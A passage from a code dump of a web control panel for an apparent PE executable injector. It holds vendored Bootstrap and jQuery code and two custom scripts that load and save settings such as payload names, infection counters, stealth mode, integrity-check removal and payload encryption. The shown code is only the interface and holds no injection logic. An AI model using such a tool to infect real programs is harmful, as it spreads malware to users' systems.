l=/top|bottom/.test(c),m=l?2*k.left-e+i:2*k.top-f+j,n=l?"offsetWidth":"offsetHeight";d.offset(b),this.replaceArrow(m,d[0][n],l)},c.prototype.replaceArrow=function(a,b,c){this.arrow().css(c?"left":"top",50*(1-a/b)+"%").css(c?"top":"left","")},c.prototype.setContent=function(){var a=this.tip(),b=this.getTitle();a.find(".tooltip-inner")[this.options.html?"html":"text"](b),a.removeClass("fade in top bottom left right")},c.prototype.hide=function(b){function d(){"in"!=e.hoverState&&f.detach(),e.$element.removeAttr("aria-describedby").trigger("hidden.bs."+e.type),b&&b()}var e=this,f=a(this.$tip),g=a.Event("hide.bs."+this.type);return this.$element.trigger(g),g.isDefaultPrevented()?void 0:(f.removeClass("in"),a.support.transition&&f.hasClass("fade")?f.one("bsTransitionEnd",d).emulateTransitionEnd(c.TRANSITION_DURATION):d(),this.hoverState=null,this)},c.prototype.fixTitle=function(){var a=this.$element;(a.attr("title")||"string"!=typeof a.attr("data-original-title"))&&a.attr("data-original-title",a.attr("title")||"").attr("title","")},c.prototype.hasContent=function(){return this.getTitle()},c.prototype.getPosition=function(b){b=b||this.$element;var c=b[0],d="BODY"==c.tagName,e=c.getBoundingClientRect();null==e.width&&(e=a.extend({},e,{width:e.right-e.left,height:e.bottom-e.top}));var f=d?{top:0,left:0}:b.offset(),g={scroll:d?document.documentElement.scrollTop||document.body.scrollTop:b.scrollTop()},h=d?{width:a(window).width(),height:a(window).height()}:null;return a.extend({},e,g,h,f)},c.prototype.getCalculatedOffset=function(a,b,c,d){return"bottom"==a?{top:b.top+b.height,left:b.left+b.width/2-c/2}:"top"==a?{top:b.top-d,left:b.left+b.width/2-c/2}:"left"==a?{top:b.top+b.height/2-d/2,left:b.left-c}:{top:b.top+b.height/2-d/2,left:b.left+b.width}},c.prototype.getViewportAdjustedDelta=function(a,b,c,d){var e={top:0,left:0};if(!this.$viewport)return e;var f=this.options.viewport&&this.options.viewport.padding||0,g=this.getPosition(this.$viewport);if(/right|left/.test(a)){var h=b.top-f-g.scroll,i=b.top+f-g.scroll+d;h<g.top?e.top=g.top-h:i>g.top+g.height&&(e.top=g.top+g.height-i)}else{var j=b.left-f,k=b.left+f+c;j<g.left?e.left=g.left-j:k>g.width&&(e.left=g.left+g.width-k)}return e},c.prototype.getTitle=function(){var a,b=this.$element,c=this.options;return a=b.attr("data-original-title")||("function"==typeof c.title?c.title.call(b[0]):c.title)},c.prototype.getUID=function(a){do a+=~~(1e6*Math.random());while(document.getElementById(a));return a},c.prototype.tip=function(){return this.$tip=this.$tip||a(this.options.template)},c.prototype.arrow=function(){return this.$arrow=this.$arrow||this.tip().find(".tooltip-arrow")},c.prototype.enable=function(){this.enabled=!0},c.prototype.disable=function(){this.enabled=!1},c.prototype.toggleEnabled=function(){this.enabled=!this.enabled},c.prototype.toggle=function(b){var c=this;b&&(c=a(b.currentTarget).data("bs."+this.type),c||(c=new this.constructor(b.currentTarget,this.getDelegateOptions()),a(b.currentTarget).data("bs."+this.type,c))),c.tip().hasClass("in")?c.leave(c):c.enter(c)},c.prototype.destroy=function(){var a=this;clearTimeout(this.timeout),this.hide(function(){a.$element.off("."+a.type).removeData("bs."+a.type)})};var d=a.fn.tooltip;a.fn.tooltip=b,a.fn.tooltip.Constructor=c,a.fn.tooltip.noConflict=function(){return a.fn.tooltip=d,this}}(jQuery),+function(a){"use strict";function b(b){return this.each(function(){var d=a(this),e=d.data("bs.popover"),f="object"==typeof b&&b;(e||!/destroy|hide/.test(b))&&(e||d.data("bs.popover",e=new c(this,f)),"string"==typeof b&&e[b]())})}var c=function(a,b){this.init("popover",a,b)};if(!a.fn.tooltip)throw new Error("Popover requires tooltip.js");c.VERSION="3.3.4",c.DEFAULTS=a.extend({},a.fn.tooltip.Constructor.DEFAULTS,{placement:"right",trigger:"click",content:"",template:'<div class="popover" role="tooltip"><div class="arrow"></div><h3 class="popover-title"></h3><div class="popover-content"></div></div>'}),c.prototype=a.extend({},a.fn.tooltip.Constructor.prototype),c.prototype.constructor=c,c.prototype.getDefaults=function(){return c.DEFAULTS},c.prototype.setContent=function(){var a=this.tip(),b=this.getTitle(),c=this.getContent();a.find(".popover-title")[this.options.html?"html":"text"](b),a.find(".popover-content").children().detach().end()[this.options.html?"string"==typeof c?"html":"append":"text"](c),a.removeClass("fade top bottom left right in"),a.find(".popover-title").html()||a.find(".popover-title").hide()},c.prototype.hasContent=function(){return this.getTitle()||this.getContent()},c.prototype.getContent=function(){var a=this.$element,b=this.options;return a.attr("data-content")||("function"==typeof b.content?b.content.call(a[0]):b.content)},c.prototype.arrow=function(){return this.$arrow=this.$arrow||this.tip().find(".arrow")};var d=a.fn.popover;a.fn.popover=b,a.fn.popover.Constructor=c,a.fn.popover.noConflict=function(){return a.fn.popover=d,this}}(jQuery),+function(a){"use strict";function b(c,d){this.$body=a(document.body),this.$scrollElement=a(a(c).is(document.body)?window:c),this.options=a.extend({},b.DEFAULTS,d),this.selector=(this.options.target||"")+" .nav li > a",this.offsets=[],this.targets=[],this.activeTarget=null,this.scrollHeight=0,this.$scrollElement.on("scroll.bs.scrollspy",a.proxy(this.process,this)),this.refresh(),this.process()}function c(c){return this.each(function(){var d=a(this),e=d.data("bs.scrollspy"),f="object"==typeof c&&c;e||d.data("bs.scrollspy",e=new b(this,f)),"string"==typeof c&&e[c]()})}b.VERSION="3.3.4",b.DEFAULTS={offset:10},b.prototype.getScrollHeight=function(){return this.$scrollElement[0].scrollHeight||Math.max(this.$body[0].scrollHeight,document.documentElement.scrollHeight)},b.prototype.refresh=function(){var b=this,c="offset",d=0;this.offsets=[],this.targets=[],this.scrollHeight=this.getScrollHeight(),a.isWindow(this.$scrollElement[0])||(c="position",d=this.$scrollElement.scrollTop()),this.$body.find(this.selector).map(function(){var b=a(this),e=b.data("target")||b.attr("href"),f=/^#./.test(e)&&a(e);return f&&f.length&&f.is(":visible")&&[[f[c]().top+d,e]]||null}).sort(function(a,b){return a[0]-b[0]}).each(function(){b.offsets.push(this[0]),b.targets.push(this[1])})},b.prototype.process=function(){var a,b=this.$scrollElement.scrollTop()+this.options.offset,c=this.getScrollHeight(),d=this.options.offset+c-this.$scrollElement.height(),e=this.offsets,f=this.targets,g=this.activeTarget;if(this.scrollHeight!=c&&this.refresh(),b>=d)return g!=(a=f[f.length-1])&&this.activate(a);if(g&&b<e[0])return this.activeTarget=null,this.clear();for(a=e.length;a--;)g!=f[a]&&b>=e[a]&&(void 0===e[a+1]||b<e[a+1])&&this.activate(f[a])},b.prototype.activate=function(b){this.activeTarget=b,this.clear();var c=this.selector+'[data-target="'+b+'"],'+this.selector+'[href="'+b+'"]',d=a(c).parents("li").addClass("active");d.parent(".dropdown-menu").length&&(d=d.closest("li.dropdown").addClass("active")),d.trigger("activate.bs.scrollspy")},b.prototype.clear=function(){a(this.selector).parentsUntil(this.options.target,".active").removeClass("active")};var d=a.fn.scrollspy;a.fn.scrollspy=c,a.fn.scrollspy.Constructor=b,a.fn.scrollspy.noConflict=function(){return a.fn.scrollspy=d,this},a(window).on("load.bs.scrollspy.data-api",function(){a('[data-spy="scroll"]').each(function(){var b=a(this);c.call(b,b.data())})})}(jQuery),+function(a){"use strict";function b(b){return this.each(function(){var d=a(this),e=d.data("bs.tab");e||d.data("bs.tab",e=new c(this)),"string"==typeof b&&e[b]()})}var c=function(b){this.element=a(b)};c.VERSION="3.3.4",c.TRANSITION_DURATION=150,c.prototype.show=function(){var b=this.element,c=b.closest("ul:not(.dropdown-menu)"),d=b.data("target");if(d||(d=b.attr("href"),d=d&&d.replace(/.*(?=#[^\s]*$)/,"")),!b.parent("li").hasClass("active")){
var e=c.find(".active:last a"),f=a.Event("hide.bs.tab",{relatedTarget:b[0]}),g=a.Event("show.bs.tab",{relatedTarget:e[0]});if(e.trigger(f),b.trigger(g),!g.isDefaultPrevented()&&!f.isDefaultPrevented()){var h=a(d);this.activate(b.closest("li"),c),this.activate(h,h.parent(),function(){e.trigger({type:"hidden.bs.tab",relatedTarget:b[0]}),b.trigger({type:"shown.bs.tab",relatedTarget:e[0]})})}}},c.prototype.activate=function(b,d,e){function f(){g.removeClass("active").find("> .dropdown-menu > .active").removeClass("active").end().find('[data-toggle="tab"]').attr("aria-expanded",!1),b.addClass("active").find('[data-toggle="tab"]').attr("aria-expanded",!0),h?(b[0].offsetWidth,b.addClass("in")):b.removeClass("fade"),b.parent(".dropdown-menu").length&&b.closest("li.dropdown").addClass("active").end().find('[data-toggle="tab"]').attr("aria-expanded",!0),e&&e()}var g=d.find("> .active"),h=e&&a.support.transition&&(g.length&&g.hasClass("fade")||!!d.find("> .fade").length);g.length&&h?g.one("bsTransitionEnd",f).emulateTransitionEnd(c.TRANSITION_DURATION):f(),g.removeClass("in")};var d=a.fn.tab;a.fn.tab=b,a.fn.tab.Constructor=c,a.fn.tab.noConflict=function(){return a.fn.tab=d,this};var e=function(c){c.preventDefault(),b.call(a(this),"show")};a(document).on("click.bs.tab.data-api",'[data-toggle="tab"]',e).on("click.bs.tab.data-api",'[data-toggle="pill"]',e)}(jQuery),+function(a){"use strict";function b(b){return this.each(function(){var d=a(this),e=d.data("bs.affix"),f="object"==typeof b&&b;e||d.data("bs.affix",e=new c(this,f)),"string"==typeof b&&e[b]()})}var c=function(b,d){this.options=a.extend({},c.DEFAULTS,d),this.$target=a(this.options.target).on("scroll.bs.affix.data-api",a.proxy(this.checkPosition,this)).on("click.bs.affix.data-api",a.proxy(this.checkPositionWithEventLoop,this)),this.$element=a(b),this.affixed=null,this.unpin=null,this.pinnedOffset=null,this.checkPosition()};c.VERSION="3.3.4",c.RESET="affix affix-top affix-bottom",c.DEFAULTS={offset:0,target:window},c.prototype.getState=function(a,b,c,d){var e=this.$target.scrollTop(),f=this.$element.offset(),g=this.$target.height();if(null!=c&&"top"==this.affixed)return c>e?"top":!1;if("bottom"==this.affixed)return null!=c?e+this.unpin<=f.top?!1:"bottom":a-d>=e+g?!1:"bottom";var h=null==this.affixed,i=h?e:f.top,j=h?g:b;return null!=c&&c>=e?"top":null!=d&&i+j>=a-d?"bottom":!1},c.prototype.getPinnedOffset=function(){if(this.pinnedOffset)return this.pinnedOffset;this.$element.removeClass(c.RESET).addClass("affix");var a=this.$target.scrollTop(),b=this.$element.offset();return this.pinnedOffset=b.top-a},c.prototype.checkPositionWithEventLoop=function(){setTimeout(a.proxy(this.checkPosition,this),1)},c.prototype.checkPosition=function(){if(this.$element.is(":visible")){var b=this.$element.height(),d=this.options.offset,e=d.top,f=d.bottom,g=a(document.body).height();"object"!=typeof d&&(f=e=d),"function"==typeof e&&(e=d.top(this.$element)),"function"==typeof f&&(f=d.bottom(this.$element));var h=this.getState(g,b,e,f);if(this.affixed!=h){null!=this.unpin&&this.$element.css("top","");var i="affix"+(h?"-"+h:""),j=a.Event(i+".bs.affix");if(this.$element.trigger(j),j.isDefaultPrevented())return;this.affixed=h,this.unpin="bottom"==h?this.getPinnedOffset():null,this.$element.removeClass(c.RESET).addClass(i).trigger(i.replace("affix","affixed")+".bs.affix")}"bottom"==h&&this.$element.offset({top:g-b-f})}};var d=a.fn.affix;a.fn.affix=b,a.fn.affix.Constructor=c,a.fn.affix.noConflict=function(){return a.fn.affix=d,this},a(window).on("load",function(){a('[data-spy="affix"]').each(function(){var c=a(this),d=c.data();d.offset=d.offset||{},null!=d.offsetBottom&&(d.offset.bottom=d.offsetBottom),null!=d.offsetTop&&(d.offset.top=d.offsetTop),b.call(c,d)})})}(jQuery);
```

`pe-injector-control/html/js/getconfig.js`:

```js
//----------------------------------------------------------------------------//
//  active when finished loading                                              //
//----------------------------------------------------------------------------//
$(document).ready(function(){
  readconfig();
});



//----------------------------------------------------------------------------//
//  functions                                                                 //
//----------------------------------------------------------------------------//

function readconfig() {

		/* create xmlhttp object */
		var xmlhttp=new XMLHttpRequest();
		
		/* set onreadystatechange function */
		xmlhttp.onreadystatechange=function() {
			if (xmlhttp.readyState==4 && xmlhttp.status==200) {
				// server request
				resttxt = xmlhttp.responseText;
				// split string to 2D-Array   (key \n value \n\n)
				var iniarray = resttxt.split("\n");
				for(i=0;i<iniarray.length;i++) {
				  //check valid (key \n value)
				  if(iniarray[i].indexOf("{|~|}") > -1) {
				    iniarray[i] = iniarray[i].split("{|~|}");
				    var key = iniarray[i][0];
				    var val = iniarray[i][1];
				    // do your thing!!!
            switch(key) {
              case 'INJECTOR_port':
                $('#controlport_write_TXT1').val(val)
                break;
              case 'INJECTOR_token':
                $('#token_write_TXT1').val(val)
                break;
              case 'WEBSERVER_port':
                $('#webport_TXT1').val(val)
                break;
              case 'WEBSERVER_localhostonly':
                val = (val == 1 || val == 'true' || val == 'True' || val == 'TRUE');
                setLocalGlobalButtons('webinterface', val);
                break;
              case 'INJECTOR_ip':
                $('#controlip_TXT1').val(val)
                break;
              case 'WEBSERVER_basicauth':
                val = (val == 1 || val == 'true' || val == 'True' || val == 'TRUE');
                setOnOffButtons('enableauth', val);
                break;
              case 'server_control_interface':
                val = (val == 1);
                setLocalGlobalButtons('controlinterface', val);
                break;
              case 'server_data_interface':
                val = (val == 1);
                setLocalGlobalButtons('datainterface', val);
                break;
              case 'integrity_remove_integrity_check':
                val = (val == 1);
                setOnOffButtons('removeintegity', val);
                break;
              case 'name_section_name_random':
                val = (val == 1);
                setOnOffButtons('randomsectionname', val);
                break;
              case 'name_section_name':
                $('#sectionname_TXT1').val(val)
                break;
              case 'server_control_port':
                $('#controlport_TXT1').val(val)
                break;
              case 'server_data_port':
                $('#dataport_TXT1').val(val)
                break;
              case 'server_token':
                $('#token_TXT1').val(val)
                break;
              case 'methods_encrypt_iterations':
                $('#encryptiterations_TXT1').val(val)
                break;
              case 'methods_method_cross_section_jump_iterations':
                $('#crosssectionjumpiterations_TXT1').val(val)
                break;
              case 'methods_method_change_flags':
                val = (val == 1);
                setOnOffButtons('changeflags', val);
                break;
              case 'methods_method_new_section':
                val = (val == 1);
                setOnOffButtons('newsection', val);
                break;
              case 'methods_method_alignment_resize':
                val = (val == 1);
                setOnOffButtons('alignmentresize', val);
                break;
              case 'methods_method_alignment':
                val = (val == 1);
                setOnOffButtons('alignment', val);
                break;
              case 'methods_encrypt':
                val = (val == 1);
                setOnOffButtons('enableencrypt', val);
                break;
              case 'methods_method_cross_section_jump':
                val = (val == 1);
                setOnOffButtons('crosssectionjump', val);
                break;
              case 'integrity_try_stay_stealth':
                val = (val == 1);
                setOnOffButtons('trystaystealth', val);
                break;
              case 'server_enable':
                val = (val == 1);
                setOnOffButtons('enable', val);
                break;
              case 'name_payload_name_x86':
                var myelement = document.getElementById("status_32bit_name");
                if(myelement != null) {
                  myelement.innerHTML = val;
                }
                break;
              case 'statistics_infection_counter_x86':
                var myelement = document.getElementById("status_32bit_counter");
                if(myelement != null) {
                  myelement.innerHTML = val;
                }
                break;
              case 'name_payload_name_x64':
                var myelement = document.getElementById("status_64bit_name");
                if(myelement != null) {
                  myelement.innerHTML = val;
                }
                break;
              case 'statistics_infection_counter_x64':
                var myelement = document.getElementById("status_64bit_counter");
                if(myelement != null) {
                  myelement.innerHTML = val;
                }
                break;
              default:
                break;
            }//END switch
				  }//END: if
				}//END for
				
			}
		}
		
		/* send request */
		xmlhttp.open("POST","/api/get/config",true);
		xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
		xmlhttp.send("key=getconfig&value=None");
}//-------------------------------------------------







```

`pe-injector-control/html/js/injector.js`:

```js
//----------------------------------------------------------------------------//
//  active when finished loading                                              //
//----------------------------------------------------------------------------//
$(document).ready(function(){
	
	/* 
	 * ON-OFF-Button function
	 * 
	 * Example: Button-Group for 'xxxxx'
	 *        <div class="btn-group">
	 *          <button type="button" id="xxxxx_ON" class="btn btn-success disabled">ON</button>
	 *          <button type="button" id="xxxxx_OFF" class="btn btn-danger disabled">OFF</button>
	 *        </div>
	 *
	 */
	$('button').on('click', function () {
		var thisID = $(this).attr('id');
		var baseID = thisID.replace("_ON","").replace("_OFF","");
		
		/* no ON/OFF Button? => return */
		if(!thisID.match(/_ON$/) && !thisID.match(/_OFF$/)) {
			//alert('wrong ID: '+thisID); // DEBUG!!!
			return;
		}

		/* determine the new status */
		var state = false;
		if(thisID.match(/_ON$/)) {
			state = true;
		}
		
		/* disable the button */
		setOnOffButtons(baseID, "disabled");
		
		/* create xmlhttp object */
		var xmlhttp=new XMLHttpRequest();
		
		/* set onreadystatechange function */
		xmlhttp.onreadystatechange=function() {
			if (xmlhttp.readyState==4 && xmlhttp.status==200) {
				// set the button to the new state
				setOnOffButtons(baseID, state);
				// alert server request
				resttxt = xmlhttp.responseText;
				if("OK" != resttxt) {
					alert(resttxt);
				}
			}
		}
		
		/* send request */
		xmlhttp.open("POST","/api/set/boolean",true);
		xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
		xmlhttp.send("key="+baseID+"&value="+state);
		

	})//-------------------------------------------------
	
	/* 
	 * LOCAL-GLOBAL-Button function
	 * 
	 * Example: Button-Group for 'yyyyy'
	 *        <div class="btn-group">
	 *          <button type="button" id="yyyyy_LOCAL" class="btn btn-info disabled">local</button>
	 *          <button type="button" id="yyyyy_GLOBAL" class="btn btn-warning disabled">global</button>
	 *        </div>
	 *
	 */
	$('button').on('click', function () {
		var thisID = $(this).attr('id');
		var baseID = thisID.replace("_LOCAL","").replace("_GLOBAL","");
		
		/* no LOCAL/GLOBAL Button */
		if(!thisID.match(/_LOCAL$/) && !thisID.match(/_GLOBAL$/)) {
			//alert('wrong ID: '+thisID); // DEBUG!!!
			return;
		}

		/* determine the new status */
		var state = false;
		if(thisID.match(/_LOCAL$/)) {
			state = true;
		}
		
		/* disable the button */
		setLocalGlobalButtons(baseID, "disabled");
		
		/* create xmlhttp object */
		var xmlhttp=new XMLHttpRequest();
		
		/* set onreadystatechange function */
		xmlhttp.onreadystatechange=function() {
			if (xmlhttp.readyState==4 && xmlhttp.status==200) {
				// set the button to the new state
				setLocalGlobalButtons(baseID, state);
				// alert server request
				resttxt = xmlhttp.responseText;
				if("OK" != resttxt) {
					alert(resttxt);
				}
			}
		}
		
		/* send request */
		xmlhttp.open("POST","/api/set/localglobal",true);
		xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
		xmlhttp.send("key="+baseID+"&value="+state);
	})//-------------------------------------------------
	
	/* 
	 * Text-Input-and-Button function
	 * 
	 * Example: Form-Group for 'zzzzz'
   *        <div class="input-group">
   *          <input type="number" id="zzzzz_TXT1" class="form-control" placeholder="loading..." min="1" max="65535">
   *          <span class="input-group-btn">
   *            <button type="button" id="zzzzz_TXT2" class="btn btn-default"><span class="glyphicon glyphicon-floppy-disk" aria-hidden="true"></span> Save</button>
   *          </span>
   *        </div>
	 *
	 */
	$('button').on('click', function () {
		var thisID = $(this).attr('id');
		var baseID = thisID.replace("_TXT2","");
		
		/* no Input and Button */
		if(!thisID.match(/_TXT2$/)) {
			//alert('wrong ID: '+thisID); // DEBUG!!!
			return;
		}

		/* get text */
		var txt = $('#'+baseID+'_TXT1').val();
		
		/* disable button */
		$('#'+baseID+'_TXT2').addClass("disabled");
		
		/* create xmlhttp object */
		var xmlhttp=new XMLHttpRequest();
		
		/* set onreadystatechange function */
		xmlhttp.onreadystatechange=function() {
			if (xmlhttp.readyState==4 && xmlhttp.status==200) {
				// enable button
				$('#'+baseID+'_TXT2').removeClass("disabled");
				// alert server request
				resttxt = xmlhttp.responseText;
				if("OK" != resttxt) {
					alert(resttxt);
				}
			}
		}
		
		/* send request */
		xmlhttp.open("POST","/api/set/text",true);
		xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
		xmlhttp.send("key="+baseID+"&value="+txt);
	})//-------------------------------------------------
	
//___________________________________________________________________
	/*
	 * the INJECTOR_RESTART_BUTTON !
	 */
	$('#inj_restart_button').on('click', function () {
		/* create xmlhttp object */
		var xmlhttp=new XMLHttpRequest();
		
		/* set onreadystatechange function */
		xmlhttp.onreadystatechange=function() {
			if (xmlhttp.readyState==4 && xmlhttp.status==200) {
				resttxt = xmlhttp.responseText;
				if("OK" != resttxt) {
					alert(resttxt);
				}else {
					// restart command received
					window.location.reload();  
				}
			}
		}
		
		/* send request */
		xmlhttp.open("POST","/api/set/event",true);
		xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
		xmlhttp.send("key=injrestart&value=void");
	})//-------------------------------------------------
	
	/*
	 * the INJECTOR_EXPORT_BUTTON !
	 */
	$('#inj_export_button').on('click', function () {
		/* create xmlhttp object */
		var xmlhttp=new XMLHttpRequest();
		
		/* set onreadystatechange function */
		xmlhttp.onreadystatechange=function() {
			if (xmlhttp.readyState==4 && xmlhttp.status==200) {
				resttxt = xmlhttp.responseText;
				// generate download
        var pom = document.createElement('a');
        pom.setAttribute('href', 'data:text/plain;charset=utf-8,' + encodeURIComponent(resttxt));
        pom.setAttribute('download', 'injector_config.ini');
        pom.style.display = 'none';
        document.body.appendChild(pom);
        pom.click();
        document.body.removeChild(pom);
			}
		}
		
		/* send request */
		xmlhttp.open("POST","/api/export",true);
		xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
		xmlhttp.send("key=exportconfig&value=void");
	})//-------------------------------------------------
	
	/*
	 * the INJECTOR_IMPORT_BUTTON !
	 */
	$('#inj_import_button').on('click', function () {
		/* send */
		alert("TODO: send INJECTOR import!");
	})//-------------------------------------------------
	
	/*
	 * Token generate BUTTON
	 */
	$('button').on('click', function () {
		var thisID = $(this).attr('id');
		var baseID = thisID.replace("_GEN","");
		
		/* no Input and Button */
		if(!thisID.match(/_GEN$/)) {
			//alert('wrong ID: '+thisID); // DEBUG!!!
			return;
		}
		
		/* generate token */
		var token = "AAAA000000000000000000000000000000000000000000000000000000000000".replace(/0/g,function(){return (~~(Math.random()*16)).toString(16);});
		token = token.toUpperCase();
		
		/* set text */
		$('#'+baseID+'_TXT1').val(token);
	})//-------------------------------------------------
	
	/*
	 * Token clear BUTTON
	 */
	$('button').on('click', function () {
		var thisID = $(this).attr('id');
		var baseID = thisID.replace("_CLS","");
		
		/* no Input and Button */
		if(!thisID.match(/_CLS$/)) {
			//alert('wrong ID: '+thisID); // DEBUG!!!
			return;
		}
		
		/* default token */
		var token = "AAAA000000000000000000000000000000000000000000000000000000000000";
		
		/* set text */
		$('#'+baseID+'_TXT1').val(token);
	})//-------------------------------------------------
	
});






//----------------------------------------------------------------------------//
//  functions                                                                 //
//----------------------------------------------------------------------------//

/*
 * set the Button-Group (ON-OFF-Button)
 * 
 * Example: Button-Group for 'xxxxx'
 *        <div class="btn-group">
 *          <button type="button" id="xxxxx_ON" class="btn btn-success disabled">ON</button>
 *          <button type="button" id="xxxxx_OFF" class="btn btn-danger disabled">OFF</button>
 *        </div>
 *
 * baseID ... string (xxxxx from the example)
 * state .... null: both buttons are gray and enabled
 *            disabled: both buttons are disabled; ON is green; OFF is red
 *            true: ON is enabled, activ and green; OFF is enabled and gray
 *            false: OFF is enabled, activ and red; ON is enabled and gray
 */
function setOnOffButtons(baseID, state) {
		/* reset all */
		$('#'+baseID+'_ON').removeClass("btn-default");
		$('#'+baseID+'_ON').removeClass("btn-success");
		$('#'+baseID+'_ON').removeClass("active");
		$('#'+baseID+'_ON').removeClass("disabled");

		$('#'+baseID+'_OFF').removeClass("btn-default");
		$('#'+baseID+'_OFF').removeClass("btn-danger");
		$('#'+baseID+'_OFF').removeClass("active");
		$('#'+baseID+'_OFF').removeClass("disabled");
		
		/* set class */
		if('null' == state) {
			$('#'+baseID+'_ON').addClass("btn-default");
			$('#'+baseID+'_OFF').addClass("btn-default");
		}else if('disabled' == state) {
			$('#'+baseID+'_ON').addClass("btn-success");
			$('#'+baseID+'_ON').addClass("disabled");
			$('#'+baseID+'_OFF').addClass("btn-danger");
			$('#'+baseID+'_OFF').addClass("disabled");
		}else if(state) {
			$('#'+baseID+'_ON').addClass("btn-success");
			$('#'+baseID+'_ON').addClass("active");
			$('#'+baseID+'_OFF').addClass("btn-default");
		}else {
			$('#'+baseID+'_ON').addClass("btn-default");
			$('#'+baseID+'_OFF').addClass("btn-danger");
			$('#'+baseID+'_OFF').addClass("active");
		}
}//-------------------------------------------------


/*
 * set the Button-Group (LOCAL-GLOBAL-Button)
 * 
 * Example: Button-Group for 'yyyyy'
 *        <div class="btn-group">
 *          <button type="button" id="yyyyy_LOCAL" class="btn btn-info disabled">local</button>
 *          <button type="button" id="yyyyy_GLOBAL" class="btn btn-warning disabled">global</button>
 *        </div>
 *
 * baseID ... string (yyyyy from the example)
 * state .... null: both buttons are gray and enabled
 *            disabled: both buttons are disabled; LOCAL is blue; GLOBAL is orange
 *            true: LOCAL is enabled, activ and blue; GLOBAL is enabled and gray
 *            false: GLOBAL is enabled, activ and orange; LOCAL is enabled and gray
 */
function setLocalGlobalButtons(baseID, state) {
		/* reset all */
		$('#'+baseID+'_LOCAL').removeClass("btn-default");
		$('#'+baseID+'_LOCAL').removeClass("btn-info");
		$('#'+baseID+'_LOCAL').removeClass("active");
		$('#'+baseID+'_LOCAL').removeClass("disabled");

		$('#'+baseID+'_GLOBAL').removeClass("btn-default");
		$('#'+baseID+'_GLOBAL').removeClass("btn-warning");
		$('#'+baseID+'_GLOBAL').removeClass("active");
		$('#'+baseID+'_GLOBAL').removeClass("disabled");
		
		/* set class */
		if('null' == state) {
			$('#'+baseID+'_LOCAL').addClass("btn-default");
			$('#'+baseID+'_GLOBAL').addClass("btn-default");
		}else if('disabled' == state) {
			$('#'+baseID+'_LOCAL').addClass("btn-info");
			$('#'+baseID+'_LOCAL').addClass("disabled");
			$('#'+baseID+'_GLOBAL').addClass("btn-warning");
			$('#'+baseID+'_GLOBAL').addClass("disabled");
		}else if(state) {
			$('#'+baseID+'_LOCAL').addClass("btn-info");
			$('#'+baseID+'_LOCAL').addClass("active");
			$('#'+baseID+'_GLOBAL').addClass("btn-default");
		}else {
			$('#'+baseID+'_LOCAL').addClass("btn-default");
			$('#'+baseID+'_GLOBAL').addClass("btn-warning");
			$('#'+baseID+'_GLOBAL').addClass("active");
		}
}//-------------------------------------------------
```

`pe-injector-control/html/js/jquery-2.1.3.min.js`:

```js
/*! jQuery v2.1.3 | (c) 2005, 2014 jQuery Foundation, Inc. | jquery.org/license */
!function(a,b){"object"==typeof module&&"object"==typeof module.exports?module.exports=a.document?b(a,!0):function(a){if(!a.document)throw new Error("jQuery requires a window with a document");return b(a)}:b(a)}("undefined"!=typeof window?window:this,function(a,b){var c=[],d=c.slice,e=c.concat,f=c.push,g=c.indexOf,h={},i=h.toString,j=h.hasOwnProperty,k={},l=a.document,m="2.1.3",n=function(a,b){return new n.fn.init(a,b)},o=/^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g,p=/^-ms-/,q=/-([\da-z])/gi,r=function(a,b){return b.toUpperCase()};n.fn=n.prototype={jquery:m,constructor:n,selector:"",length:0,toArray:function(){return d.call(this)},get:function(a){return null!=a?0>a?this[a+this.length]:this[a]:d.call(this)},pushStack:function(a){var b=n.merge(this.constructor(),a);return b.prevObject=this,b.context=this.context,b},each:function(a,b){return n.each(this,a,b)},map:function(a){return this.pushStack(n.map(this,function(b,c){return a.call(b,c,b)}))},slice:function(){return this.pushStack(d.apply(this,arguments))},first:function(){return this.eq(0)},last:function(){return this.eq(-1)},eq:function(a){var b=this.length,c=+a+(0>a?b:0);return this.pushStack(c>=0&&b>c?[this[c]]:[])},end:function(){return this.prevObject||this.constructor(null)},push:f,sort:c.sort,splice:c.splice},n.extend=n.fn.extend=function(){var a,b,c,d,e,f,g=arguments[0]||{},h=1,i=arguments.length,j=!1;for("boolean"==typeof g&&(j=g,g=arguments[h]||{},h++),"object"==typeof g||n.isFunction(g)||(g={}),h===i&&(g=this,h--);i>h;h++)if(null!=(a=arguments[h]))for(b in a)c=g[b],d=a[b],g!==d&&(j&&d&&(n.isPlainObject(d)||(e=n.isArray(d)))?(e?(e=!1,f=c&&n.isArray(c)?c:[]):f=c&&n.isPlainObject(c)?c:{},g[b]=n.extend(j,f,d)):void 0!==d&&(g[b]=d));return g},n.extend({expando:"jQuery"+(m+Math.random()).replace(/\D/g,""),isReady:!0,error:function(a){throw new Error(a)},noop:function(){},isFunction:function(a){return"function"===n.type(a)},isArray:Array.isArray,isWindow:function(a){return null!=a&&a===a.window},isNumeric:function(a){return!n.isArray(a)&&a-parseFloat(a)+1>=0},isPlainObject:function(a){return"object"!==n.type(a)||a.nodeType||n.isWindow(a)?!1:a.constructor&&!j.call(a.constructor.prototype,"isPrototypeOf")?!1:!0},isEmptyObject:function(a){var b;for(b in a)return!1;return!0},type:function(a){return null==a?a+"":"object"==typeof a||"function"==typeof a?h[i.call(a)]||"object":typeof a},globalEval:function(a){var b,c=eval;a=n.trim(a),a&&(1===a.indexOf("use strict")?(b=l.createElement("script"),b.text=a,l.head.appendChild(b).parentNode.removeChild(b)):c(a))},camelCase:function(a){return a.replace(p,"ms-").replace(q,r)},nodeName:function(a,b){return a.nodeName&&a.nodeName.toLowerCase()===b.toLowerCase()},each:function(a,b,c){var d,e=0,f=a.length,g=s(a);if(c){if(g){for(;f>e;e++)if(d=b.apply(a[e],c),d===!1)break}else for(e in a)if(d=b.apply(a[e],c),d===!1)break}else if(g){for(;f>e;e++)if(d=b.call(a[e],e,a[e]),d===!1)break}else for(e in a)if(d=b.call(a[e],e,a[e]),d===!1)break;return a},trim:function(a){return null==a?"":(a+"").replace(o,"")},makeArray:function(a,b){var c=b||[];return null!=a&&(s(Object(a))?n.merge(c,"string"==typeof a?[a]:a):f.call(c,a)),c},inArray:function(a,b,c){return null==b?-1:g.call(b,a,c)},merge:function(a,b){for(var c=+b.length,d=0,e=a.length;c>d;d++)a[e++]=b[d];return 